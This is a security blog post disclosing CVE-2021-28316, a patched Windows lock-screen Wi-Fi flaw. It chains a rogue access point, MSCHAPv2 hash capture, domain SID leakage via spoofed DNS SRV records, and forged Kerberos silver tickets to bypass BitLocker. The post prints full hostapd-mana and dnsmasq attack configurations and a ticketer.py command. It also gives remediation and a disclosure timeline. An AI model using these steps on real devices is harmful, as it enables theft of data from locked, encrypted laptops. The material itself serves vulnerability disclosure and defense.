<!doctype html><html lang=en dir=auto data-theme=light><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Airstrike Attack - FDE bypass and EoP on domain joined Windows workstations (CVE 2021-28316) |</title><meta name=keywords content><meta name=description content="
    
    There should have been a video here but your browser does not seem
    to support it.


Summary
By default, domain joined Windows workstations allow access to the network selection UI from the lock screen.
An attacker with physical access to a locked device with WiFI capabilities (such as a laptop or a workstation) can abuse this functionality to force the laptop to authenticate against a rogue access point and capture a MSCHAPV2 challenge response hash for the domain computer account."><meta name=author content="Matt Johnson"><link rel=canonical href=https://breakfix.co/posts/airstrike-attack-cve-2021-28316/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.7dffa467ed2caf12b1371c26b29262254b90390e9b746ee6615f35700c6d8ec6.css integrity="sha256-ff+kZ+0srxKxNxwmspJiJUuQOQ6bdG7mYV81cAxtjsY=" rel="preload stylesheet" as=style><link rel=icon href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://breakfix.co/posts/airstrike-attack-cve-2021-28316/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"&&(document.querySelector("html").dataset.theme="dark")</script><meta property="og:url" content="https://breakfix.co/posts/airstrike-attack-cve-2021-28316/"><meta property="og:site_name" content=" "><meta property="og:title" content="Airstrike Attack - FDE bypass and EoP on domain joined Windows workstations (CVE 2021-28316)"><meta property="og:description" content=" There should have been a video here but your browser does not seem to support it. Summary By default, domain joined Windows workstations allow access to the network selection UI from the lock screen.
An attacker with physical access to a locked device with WiFI capabilities (such as a laptop or a workstation) can abuse this functionality to force the laptop to authenticate against a rogue access point and capture a MSCHAPV2 challenge response hash for the domain computer account."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-04-14T07:58:57+11:00"><meta property="article:modified_time" content="2021-04-14T07:58:57+11:00"><meta property="og:image" content="https://breakfix.co/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://breakfix.co/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Airstrike Attack - FDE bypass and EoP on domain joined Windows workstations (CVE 2021-28316)"><meta name=twitter:description content="
    
    There should have been a video here but your browser does not seem
    to support it.


Summary
By default, domain joined Windows workstations allow access to the network selection UI from the lock screen.
An attacker with physical access to a locked device with WiFI capabilities (such as a laptop or a workstation) can abuse this functionality to force the laptop to authenticate against a rogue access point and capture a MSCHAPV2 challenge response hash for the domain computer account."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://breakfix.co/posts/"},{"@type":"ListItem","position":2,"name":"Airstrike Attack - FDE bypass and EoP on domain joined Windows workstations (CVE 2021-28316)","item":"https://breakfix.co/posts/airstrike-attack-cve-2021-28316/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Airstrike Attack - FDE bypass and EoP on domain joined Windows workstations (CVE 2021-28316)","name":"Airstrike Attack - FDE bypass and EoP on domain joined Windows workstations (CVE 2021-28316)","description":" There should have been a video here but your browser does not seem to support it. Summary By default, domain joined Windows workstations allow access to the network selection UI from the lock screen.\nAn attacker with physical access to a locked device with WiFI capabilities (such as a laptop or a workstation) can abuse this functionality to force the laptop to authenticate against a rogue access point and capture a MSCHAPV2 challenge response hash for the domain computer account.\n","keywords":[],"articleBody":" There should have been a video here but your browser does not seem to support it. Summary By default, domain joined Windows workstations allow access to the network selection UI from the lock screen.\nAn attacker with physical access to a locked device with WiFI capabilities (such as a laptop or a workstation) can abuse this functionality to force the laptop to authenticate against a rogue access point and capture a MSCHAPV2 challenge response hash for the domain computer account.\nThis challenge response hash can then be submitted to crack.sh to recover the NTLM hash of the computer account in less than 24 hours.\nOnce recovered, this NTLM hash combined with the domain SID can be used to forge Kerberos silver tickets to impersonate a privileged user and compromise the host. An example of this is to create a silver ticket for the CIFS service of the laptop in order to authenticate over SMB as the SYSTEM user and gain unrestricted access to the hard disk.\nAs the attack can be performed from a locked device, it can be utilised to bypass BitLocker full disk encryption and gain access to the devices file system.\nIn addition, as silver tickets can be forged for privileged users, this attack can also be leveraged to elevate privileges to that of local administrator on the device.\nAffected Versions The vulnerability was confirmed to be present on domain joined Windows 10 hosts. Older versions of Windows may also be affected but have not been tested.\nBackground Those familiar with enterprise wireless networks will likely be familiar with the Protected Extensible Authentication Protocol (PEAP).\nPEAP is a tunneled authentication protocol, which means that an SSL tunnel is first established with the RADIUS server (known as Phase 1) in order to protect the credential material sent during authentication (Phase 2).\nOne of the most common inner authentication methods used in Windows environments is MSCHAPv2. The MSCHAPv2 protocol has been around for a long time and has some severe cryptographic flaws, as demonstrated by Moxie Marlinspike and David Hulton in one of my all time favorite DEF CON talks here.\nThe culmination of this research is the crack.sh service, which guarantees the recovery of an NTLM hash for any given MSCHAPv2 challenge response hash (regardless of password complexity).\nIn Windows environments, when a domain user authenticates to a wireless access point using PEAP with MSCHAPv2 the resulting challenge response hash is derived from the NTLM hash of the domain user’s password.\nIn addition to domain user authentication, Windows also provides the option to use Machine / Computer Authentication. This is used to allow the device to authenticate to the wireless network prior to the domain user logging in.\nComputer authentication is required to solve the “chicken and the egg” situation that arises when a device first needs to authenticate to the network before it is able to reach Active Directory and authenticate the domain user. In order to create a seamless experience for the user, this authentication takes place from the lock screen prior to the user logging into the device.\nComputer authentication can use either client certificates or MSCHAPV2 for it’s inner authentication mechanism. In the case of client certificates, a certificate issued for the domain computer account is used to authenticate. But what happens if computer authentication is used with PEAP and MSCHAPv2 ? In this case, the NTLM hash of the domain computer account is used for authentication.\nComputer account passwords are complex, long and randomly generated. There is no way that we will ever be able to recover the plain text password for this account, so why does this matter ? Well, we can’t recover the plain text password but thanks to crack.sh we can recover the NTLM hash.\nComputer account NTLM hashes have a special significance in the context of Windows domain environments as they relate to Kerberos silver tickets. Kerberos service tickets for services hosted by the computer (for example the CIFS service) are signed and encrypted using the computer account’s NTLM hash.\nIn order to forge service tickets we need the following information:\nNTLM hash of the computer account Service Name we want to gain access to The Domain SID Once we have recovered the computer account NTLM hash from crack.sh, all we require is the domain SID and we can forge our own tickets. The domain SID is not secret information and can be retrieved by any regular domain user.\nPrivilege escalation from domain user to local administrator To weaponize this, we first need to create a rogue access point that supports PEAP with MSCHAPV2 set as the inner authentication method. There are many tools to accomplish this, here we are using hostapd-mana.\nNote In order to allow later versions of Windows 10 to connect to the access point, the RADIUS server certificate needs to be signed using a trusted CA. Failure to do this will result in a vague “failed to connect” error on the Windows 10 supplicant.\nHere we are using LetsEncrypt to achieve this with the below commands (note the server name on the certificate is irrelevant - it just needs to be signed by a trusted authority).\n# Generate LetsEncrypt certificates sudo snap install --classic certbot sudo certbot certonly --standalone -d radius.breakfix.co Once the certificates are generated, we rename them to make more sense with our hostapd config and generate the DH params.\n# Rename certificates to work with hostapd cp /etc/letsencrypt/live/radius.breakfix.co/fullchain.pem ca.pem cp /etc/letsencrypt/live/radius.breakfix.co/privkey.pem server.key cp /etc/letsencrypt/live/radius.breakfix.co/cert.pem server.pem # Generate DH params openssl dhparam 2048 \u003e dhparam.pem Then we create a “hostapd.conf” file with the contents below\ninterface=$WIRELESS_INTERFACE_HERE ssid=Airstrike hw_mode=g channel=6 wpa=3 wpa_key_mgmt=WPA-EAP wpa_pairwise=TKIP CCMP auth_algs=3 ieee8021x=1 eapol_key_index_workaround=0 eap_server=1 eap_user_file=hostapd.eap_user ca_cert=ca.pem server_cert=server.pem private_key=server.key private_key_passwd= dh_file=dhparam.pem mana_wpe=1 And “hostapd.eap_user” file with the contents below\n*\tPEAP,TTLS,TLS,MD5,GTC \"t\" GTC,TTLS-MSCHAPV2,MSCHAPV2,MD5,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP \"1234test\" [2] Once this has been done hostpad-mana can be run with the command ./hostapd hostpad.conf. At this point the attacker can force the laptop to connect to the access point from the lock screen (ignoring the certificate error) resulting in a capture of the MSCHAPV2 challenge response hash for the computer account as seen below.\nThe wireless authentication will fail at this stage as MSCHAPv2 requires that the access point also has knowledge of the password, but the challenge response hash will be captured.\nRecovering the NTLM hash This captured MSCHAPv2 challenge response hash can then be converted to Cloud Crack format using the tool chapcrack and submitted to crack.sh for cracking.\nFor POC purposes, in our lab, we use the tool secretsdump.py from Impacket to validate that the first 4 bytes of K3 outputted by chapcrack match the last 4 bytes of the NTLM hash for the computer account.\nAs an authenticated domain user, we can fetch the domain SID in many different ways. The easiest is to simply run whoami /all.\nWe now have all the information required to forge a sliver ticket for the CIFS service on the device. As we can specify the user and group SIDs contained within the service ticket we can use this to access the CIFS service as an administrative user.\nWe can do this using the tool ticketer.py from Impacket and the below commands.\nticketer.py -nthash c86afa9bd3c7afa9ff31da6af182ddbe -domain-sid S-1-5-21-553012155-822088108-1873906631 -domain INITECH.local -spn cifs/DESKTOP-J5KI5KA.initech.local administrator export KRB5CCNAME=administrator.ccache Using smbclient, we now have access to the entire file system of the laptop.\nTools such as smbexec.py from Impacket provide an easy way to gain command execution on the host under the security context of the SYSTEM user.\nAfter later discovering that it was possible to elicit the challenge response hash from the lock screen, this opened up some more interesting attack scenarios, such as targeting locked laptops with Full Disk Encryption (FDE) enabled.\nIn order to exploit this, however, there was one important piece of the puzzle missing, the domain SID. We needed a way to recover it without first being logged into the machine.\nThe missing piece of the puzzle Many months after discovering this attack, we were approached by a client to perform a test on one of their SOE laptops. One specific concern they had was what damage could be done if an attacker was able to get their hands on a locked laptop protected with BitLocker full disk encryption.\nAfter this specific scenario was put forth, myself and my colleague @DanyalDrew revisited the idea and set out to see if we could discover a way to leak the domain SID without being logged into the machine.\nWhen a domain joined computer first accesses a network, a number of CLDAP searches are performed in order to identify which services are available on the Domain Controller. These messages are referred to as the LDAP ping.\nThis sounded promising, as the CLDAP query used during this discovery process contains the following information:\nDnsDomain Host DnsHostName User DomainSid DomainGuid Our initial tests involved running Wireshark captures and observing the LDAP DNS requests made by the wireless client.\nAfter adding these srv-host DNS entries into our dnsmasq config and reconnecting the client, we found what we were looking for.\nWith that, we now had everything we needed to attempt to break into the locked laptop.\nGaining access to a locked machine with full disk encryption enabled The same rouge AP configuration can be used to capture the challenge response hash from the lock screen of the target device and submit to crack.sh.\nTo leak the domain SID, we need to join the laptop to an attacker controlled network where we will respond to all DNS SRV requests made by the laptop with the attackers IP address.\nThis will allow us to capture the “LDAP ping” packets that contain the domain SID and domain name. Once again, we will run a rogue access point and force the client to connect from the lock screen. However, instead of configuring the access point to support PEAP authentication, this time we will create a WPA2-PSK network using the below hostapd.conf and hostapd-psk file.\ninterface=$WIRELESS_INTERFACE_HERE ssid=Airstrike_WPA channel=1 auth_algs=1 wpa=3 wpa_psk_file=./hostapd-psk wpa_key_mgmt=WPA-PSK wpa_pairwise=CCMP TKIP rsn_pairwise=CCMP And create a file hostapd-psk to configure the password for the network. 00:00:00:00:00:00 airstrike\nAs we want the laptop to connect to our network, we will also need to run a DHCP and DNS server using dnsmasq with the below dnsmasq.conf file.\ninterface=$WIRELESS_INTERFACE_HERE dhcp-range=10.0.0.10,10.0.0.100,8h dhcp-option=3,10.0.0.1 dhcp-option=6,10.0.0.1 server=8.8.8.8 log-queries log-dhcp Now we can assign an IP address to our wireless adapter and start the DNS / DHCP server.\nifconfig $WIRELESS_INTERFACE 10.0.0.1/24 up dnsmasq -d -C dnsmasq.conf In order to capture traffic from the laptop we will also enable tcpdump on the wireless interface.\ntcpdump -i $WIRELESS_INTERFACE -s 65535 -w $OUT_FILE.pcap Once this is running, we can connect to the wireless network from the lock screen and should see the laptop receive an IP from our DHCP server.\nWhen the laptop first connects, we will see a number of SRV DNS requests that will not be responded to. We will take note of each of these and modify our dnsmasq.conf file to respond to them with the IP address of our wireless access point.\ninterface=$WIRELESS_INTERFACE_HERE dhcp-range=10.0.0.10,10.0.0.100,8h dhcp-option=3,10.0.0.1 dhcp-option=6,10.0.0.1 server=8.8.8.8 log-queries log-dhcp srv-host=_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.INITECH.local,10.0.0.1,389 srv-host=_ldap._tcp.dc._msdcs.INITECH.local,10.0.0.1,389 srv-host=_ldap._tcp.a3fcc77a-710d-4956-af07-bfa9187b91e9.domains._msdcs.INITECH.local,10.0.0.1,389 srv-host=_ldap._tcp.INITECH.local,10.0.0.1,389 We can now disconnect and reconnect the laptop from our access point and examine the contents of our new pcap file. If we filter our packets for the CLDAP protocol we can see the laptop attempting an LDAP ping against our attacker IP. The contents of the LDAP ping messages contain the Active Directory domain name, host name of the laptop and domain SID.\nWe can once again use the tool ticketer.py to create a silver ticket for the CIFS service and authenticate using smbclient to gain unrestricted access to the device’s file system.\nNote: There may be instances in which the default RID 500 account does not have local administrator rights on the domain joined host. In this case, a brute force approach can be taken by incrementing the RID contained in the silver ticket until a valid account is found.\nRemediation This issue was disclosed to the Microsoft Security Response Center and has been addressed in the latest April 2021 security update.\nAs a further hardening measure, the ability to access the network selection UI from the lock screen can be disabled via the below Group Policy setting.\nComputer Configuration | Administrative Templates | System | Logon --\u003e Do not display network selection UI This setting can also be configured via the registry by enabling the DontDisplayNetworkSelectionUI flag.\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System] \"DontDisplayNetworkSelectionUI\"=dword:00000001 Acknowledgements Thanks to Elad Shamir @elad_shamir for his guidance and encouragement to continue research into the issue.\nAlso thanks to Danyal Drew @DanyalDrew for helping to solve the domain SID problem allowing for FDE bypass.\nFurther thanks to Moxie Marlinspike and David Hulton for the inspiring talk and the crack.sh service which makes this exploit possible.\nDisclosure Timeline 11/12/2020 - Issue reported to MSRC with 90 day disclosure deadline 9/01/2021 - Update from MSRC that they are investigating the issue 29/01/2021 - MSRC ask for more time to explore potential fixes 11/03/2021 - MSRC confirm the behavior reported 12/04/2021 - MSRC confirm a patch will be released as part of the April security update 14/04/2021 - Microsoft release patch in April security update (CVE 2021-28316 assigned) This article was also posted on shenaniganslabs.io\n","wordCount":"2206","inLanguage":"en","image":"https://breakfix.co/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2021-04-14T07:58:57+11:00","dateModified":"2021-04-14T07:58:57+11:00","author":{"@type":"Person","name":"Matt Johnson"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://breakfix.co/posts/airstrike-attack-cve-2021-28316/"},"publisher":{"@type":"Organization","name":" ","logo":{"@type":"ImageObject","url":"https://breakfix.co/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://breakfix.co/ accesskey=h title="  (Alt + H)"><img src=https://breakfix.co/logo/logo.svg alt aria-label=logo height=50></a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://breakfix.co/contact/ title=Contact><span>Contact</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://breakfix.co/>Home</a>&nbsp;»&nbsp;<a href=https://breakfix.co/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Airstrike Attack - FDE bypass and EoP on domain joined Windows workstations (CVE 2021-28316)</h1><div class=post-meta><span title='2021-04-14 07:58:57 +1100 +1100'>April 14, 2021</span>&nbsp;·&nbsp;<span>11 min</span>&nbsp;·&nbsp;<span>2206 words</span>&nbsp;·&nbsp;<span>Matt Johnson</span></div></header><div class=post-content><video width=640 height=360 class=video-shortcode preload=auto controls>
<source src=/airstrike/airstrike.mp4 type=video/mp4>There should have been a video here but your browser does not seem
to support it.</video><h3 id=summary>Summary<a hidden class=anchor aria-hidden=true href=#summary>#</a></h3><p>By default, domain joined Windows workstations allow access to the network selection UI from the lock screen.</p><p>An attacker with physical access to a locked device with WiFI capabilities (such as a laptop or a workstation) can abuse this functionality to force the laptop to authenticate against a rogue access point and capture a MSCHAPV2 challenge response hash for the domain computer account.</p><p>This challenge response hash can then be submitted to <a href=https://crack.sh/wpa-enterprise/>crack.sh</a> to recover the NTLM hash of the computer account in less than 24 hours.</p><p>Once recovered, this NTLM hash combined with the domain SID can be used to forge Kerberos silver tickets to impersonate a privileged user and compromise the host. An example of this is to create a silver ticket for the CIFS service of the laptop in order to authenticate over SMB as the SYSTEM user and gain unrestricted access to the hard disk.</p><p>As the attack can be performed from a locked device, it can be utilised to bypass BitLocker full disk encryption and gain access to the devices file system.</p><p>In addition, as silver tickets can be forged for privileged users, this attack can also be leveraged to elevate privileges to that of local administrator on the device.</p><h3 id=affected-versions>Affected Versions<a hidden class=anchor aria-hidden=true href=#affected-versions>#</a></h3><p>The vulnerability was confirmed to be present on domain joined Windows 10 hosts. Older versions of Windows may also be affected but have not been tested.</p><h3 id=background>Background<a hidden class=anchor aria-hidden=true href=#background>#</a></h3><p>Those familiar with enterprise wireless networks will likely be familiar with the Protected Extensible Authentication Protocol (PEAP).</p><p>PEAP is a tunneled authentication protocol, which means that an SSL tunnel is first established with the RADIUS server (known as Phase 1) in order to protect the credential material sent during authentication (Phase 2).</p><p>One of the most common inner authentication methods used in Windows environments is MSCHAPv2. The MSCHAPv2 protocol has been around for a long time and has some severe cryptographic flaws, as demonstrated by Moxie Marlinspike and David Hulton in one of my all time favorite DEF CON talks <a href="https://www.youtube.com/watch?v=gkPvZDcrLFk">here</a>.</p><p>The culmination of this research is the <a href=https://crack.sh/wpa-enterprise/>crack.sh</a> service, which guarantees the recovery of an NTLM hash for any given MSCHAPv2 challenge response hash (regardless of password complexity).</p><p>In Windows environments, when a domain user authenticates to a wireless access point using PEAP with MSCHAPv2 the resulting challenge response hash is derived from the NTLM hash of the domain user&rsquo;s password.</p><p>In addition to domain user authentication, Windows also provides the option to use Machine / Computer Authentication. This is used to allow the device to authenticate to the wireless network prior to the domain user logging in.</p><p>Computer authentication is required to solve the &ldquo;chicken and the egg&rdquo; situation that arises when a device first needs to authenticate to the network before it is able to reach Active Directory and authenticate the domain user. In order to create a seamless experience for the user, this authentication takes place from the lock screen prior to the user logging into the device.</p><p>Computer authentication can use either client certificates or MSCHAPV2 for it&rsquo;s inner authentication mechanism. In the case of client certificates, a certificate issued for the domain computer account is used to authenticate. But what happens if computer authentication is used with PEAP and MSCHAPv2 ? In this case, the NTLM hash of the domain computer account is used for authentication.</p><p>Computer account passwords are complex, long and randomly generated. There is no way that we will ever be able to recover the plain text password for this account, so why does this matter ? Well, we can&rsquo;t recover the plain text password but thanks to <a href=https://crack.sh/wpa-enterprise/>crack.sh</a> we can recover the NTLM hash.</p><p>Computer account NTLM hashes have a special significance in the context of Windows domain environments as they relate to Kerberos silver tickets. Kerberos service tickets for services hosted by the computer (for example the CIFS service) are signed and encrypted using the computer account&rsquo;s NTLM hash.</p><p>In order to forge service tickets we need the following information:</p><ul><li>NTLM hash of the computer account</li><li>Service Name we want to gain access to</li><li>The Domain SID</li></ul><p>Once we have recovered the computer account NTLM hash from <a href=https://crack.sh/wpa-enterprise/>crack.sh</a>, all we require is the domain SID and we can forge our own tickets. The domain SID is not secret information and can be retrieved by any regular domain user.</p><h3 id=privilege-escalation-from-domain-user-to-local-administrator>Privilege escalation from domain user to local administrator<a hidden class=anchor aria-hidden=true href=#privilege-escalation-from-domain-user-to-local-administrator>#</a></h3><p>To weaponize this, we first need to create a rogue access point that supports PEAP with MSCHAPV2 set as the inner authentication method. There are many tools to accomplish this, here we are using <a href=https://github.com/sensepost/hostapd-mana>hostapd-mana</a>.</p><p><strong>Note</strong> In order to allow later versions of Windows 10 to connect to the access point, the RADIUS server certificate needs to be signed using a trusted CA. Failure to do this will result in a vague &ldquo;failed to connect&rdquo; error on the Windows 10 supplicant.</p><p>Here we are using LetsEncrypt to achieve this with the below commands (note the server name on the certificate is irrelevant - it just needs to be signed by a trusted authority).</p><pre><code># Generate LetsEncrypt certificates
sudo snap install --classic certbot
sudo certbot certonly --standalone -d radius.breakfix.co
</code></pre><p>Once the certificates are generated, we rename them to make more sense with our hostapd config and generate the DH params.</p><pre><code># Rename certificates to work with hostapd
cp /etc/letsencrypt/live/radius.breakfix.co/fullchain.pem ca.pem
cp /etc/letsencrypt/live/radius.breakfix.co/privkey.pem server.key
cp /etc/letsencrypt/live/radius.breakfix.co/cert.pem server.pem

# Generate DH params
openssl dhparam 2048 &gt; dhparam.pem
</code></pre><p>Then we create a &ldquo;hostapd.conf&rdquo; file with the contents below</p><pre><code>interface=$WIRELESS_INTERFACE_HERE
ssid=Airstrike
hw_mode=g
channel=6 

wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
auth_algs=3

ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=ca.pem
server_cert=server.pem
private_key=server.key
private_key_passwd=
dh_file=dhparam.pem

mana_wpe=1
</code></pre><p>And &ldquo;hostapd.eap_user&rdquo; file with the contents below</p><pre><code>*		PEAP,TTLS,TLS,MD5,GTC
&quot;t&quot;     	GTC,TTLS-MSCHAPV2,MSCHAPV2,MD5,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP  &quot;1234test&quot;  [2]
</code></pre><p>Once this has been done hostpad-mana can be run with the command <code>./hostapd hostpad.conf</code>. At this point the attacker can force the laptop to connect to the access point from the lock screen (ignoring the certificate error) resulting in a capture of the MSCHAPV2 challenge response hash for the computer account as seen below.</p><p><img alt=lockscreen loading=lazy src=/airstrike/1_lockscreen.png></p><p><img alt=hostapd loading=lazy src=/airstrike/2_hostapd.png></p><p>The wireless authentication will fail at this stage as MSCHAPv2 requires that the access point also has knowledge of the password, but the challenge response hash will be captured.</p><h3 id=recovering-the-ntlm-hash>Recovering the NTLM hash<a hidden class=anchor aria-hidden=true href=#recovering-the-ntlm-hash>#</a></h3><p>This captured MSCHAPv2 challenge response hash can then be converted to Cloud Crack format using the tool <a href=https://github.com/moxie0/chapcrack>chapcrack</a> and submitted to <a href=https://crack.sh/wpa-enterprise/>crack.sh</a> for cracking.</p><p><img alt=chapcrack loading=lazy src=/airstrike/3_chapcrack.png></p><p>For POC purposes, in our lab, we use the tool <code>secretsdump.py</code> from <a href=https://github.com/SecureAuthCorp/impacket>Impacket</a> to validate that the first 4 bytes of K3 outputted by chapcrack match the last 4 bytes of the NTLM hash for the computer account.</p><p><img alt=secrets_dump loading=lazy src=/airstrike/4_secrets_dump.png></p><p>As an authenticated domain user, we can fetch the domain SID in many different ways. The easiest is to simply run <code>whoami /all</code>.</p><p><img alt=whoami loading=lazy src=/airstrike/5_whoami.png></p><p>We now have all the information required to forge a sliver ticket for the CIFS service on the device. As we can specify the user and group SIDs contained within the service ticket we can use this to access the CIFS service as an administrative user.</p><p>We can do this using the tool <code>ticketer.py</code> from <a href=https://github.com/SecureAuthCorp/impacket>Impacket</a> and the below commands.</p><pre><code>ticketer.py -nthash c86afa9bd3c7afa9ff31da6af182ddbe -domain-sid S-1-5-21-553012155-822088108-1873906631 -domain INITECH.local -spn cifs/DESKTOP-J5KI5KA.initech.local administrator
export KRB5CCNAME=administrator.ccache
</code></pre><p><img alt=ticketer loading=lazy src=/airstrike/6_ticketer.png></p><p>Using smbclient, we now have access to the entire file system of the laptop.</p><p><img alt=smbclient loading=lazy src=/airstrike/7_smbclient.png></p><p>Tools such as <code>smbexec.py</code> from <a href=https://github.com/SecureAuthCorp/impacket>Impacket</a> provide an easy way to gain command execution on the host under the security context of the SYSTEM user.</p><p><img alt=smbexec loading=lazy src=/airstrike/8_smbexec_whoami.png></p><p>After later discovering that it was possible to elicit the challenge response hash from the lock screen, this opened up some more interesting attack scenarios, such as targeting locked laptops with Full Disk Encryption (FDE) enabled.</p><p>In order to exploit this, however, there was one important piece of the puzzle missing, the domain SID. We needed a way to recover it without first being logged into the machine.</p><h3 id=the-missing-piece-of-the-puzzle>The missing piece of the puzzle<a hidden class=anchor aria-hidden=true href=#the-missing-piece-of-the-puzzle>#</a></h3><p>Many months after discovering this attack, we were approached by a client to perform a test on one of their SOE laptops. One specific concern they had was what damage could be done if an attacker was able to get their hands on a locked laptop protected with BitLocker full disk encryption.</p><p>After this specific scenario was put forth, myself and my colleague <a href=https://twitter.com/danyaldrew>@DanyalDrew</a> revisited the idea and set out to see if we could discover a way to leak the domain SID without being logged into the machine.</p><p>When a domain joined computer first accesses a network, a number of CLDAP searches are performed in order to identify which services are available on the Domain Controller. These messages are referred to as the <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/895a7744-aff3-4f64-bcfa-f8c05915d2e9>LDAP ping</a>.</p><p>This sounded promising, as the CLDAP query used during this discovery process contains the following information:</p><ul><li>DnsDomain</li><li>Host</li><li>DnsHostName</li><li>User</li><li>DomainSid</li><li>DomainGuid</li></ul><p>Our initial tests involved running Wireshark captures and observing the LDAP DNS requests made by the wireless client.</p><p><img alt=domain_sid loading=lazy src=/airstrike/9_domain_sid_wireshark.png></p><p>After adding these <code>srv-host</code> DNS entries into our dnsmasq config and reconnecting the client, we found what we were looking for.</p><p><img alt=domain_sid_2 loading=lazy src=/airstrike/10_domain_sid_wireshark_2.png></p><p>With that, we now had everything we needed to attempt to break into the locked laptop.</p><h3 id=gaining-access-to-a-locked-machine-with-full-disk-encryption-enabled>Gaining access to a locked machine with full disk encryption enabled<a hidden class=anchor aria-hidden=true href=#gaining-access-to-a-locked-machine-with-full-disk-encryption-enabled>#</a></h3><p>The same rouge AP configuration can be used to capture the challenge response hash from the lock screen of the target device and submit to crack.sh.</p><p>To leak the domain SID, we need to join the laptop to an attacker controlled network where we will respond to all DNS SRV requests made by the laptop with the attackers IP address.</p><p>This will allow us to capture the &ldquo;LDAP ping&rdquo; packets that contain the domain SID and domain name. Once again, we will run a rogue access point and force the client to connect from the lock screen. However, instead of configuring the access point to support PEAP authentication, this time we will create a WPA2-PSK network using the below <code>hostapd.conf</code> and <code>hostapd-psk</code> file.</p><pre><code>interface=$WIRELESS_INTERFACE_HERE
ssid=Airstrike_WPA
channel=1
auth_algs=1
wpa=3
wpa_psk_file=./hostapd-psk
wpa_key_mgmt=WPA-PSK 
wpa_pairwise=CCMP TKIP
rsn_pairwise=CCMP
</code></pre><p>And create a file <code>hostapd-psk</code> to configure the password for the network.
<code>00:00:00:00:00:00 airstrike</code></p><p>As we want the laptop to connect to our network, we will also need to run a DHCP and DNS server using <code>dnsmasq</code> with the below <code>dnsmasq.conf</code> file.</p><pre><code>interface=$WIRELESS_INTERFACE_HERE
dhcp-range=10.0.0.10,10.0.0.100,8h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
</code></pre><p>Now we can assign an IP address to our wireless adapter and start the DNS / DHCP server.</p><pre><code>ifconfig $WIRELESS_INTERFACE 10.0.0.1/24 up
dnsmasq -d -C dnsmasq.conf
</code></pre><p>In order to capture traffic from the laptop we will also enable tcpdump on the wireless interface.</p><pre><code>tcpdump -i $WIRELESS_INTERFACE -s 65535 -w $OUT_FILE.pcap
</code></pre><p>Once this is running, we can connect to the wireless network from the lock screen and should see the laptop receive an IP from our DHCP server.</p><p>When the laptop first connects, we will see a number of SRV DNS requests that will not be responded to. We will take note of each of these and modify our <code>dnsmasq.conf</code> file to respond to them with the IP address of our wireless access point.</p><pre><code>interface=$WIRELESS_INTERFACE_HERE
dhcp-range=10.0.0.10,10.0.0.100,8h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp

srv-host=_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.INITECH.local,10.0.0.1,389
srv-host=_ldap._tcp.dc._msdcs.INITECH.local,10.0.0.1,389
srv-host=_ldap._tcp.a3fcc77a-710d-4956-af07-bfa9187b91e9.domains._msdcs.INITECH.local,10.0.0.1,389
srv-host=_ldap._tcp.INITECH.local,10.0.0.1,389
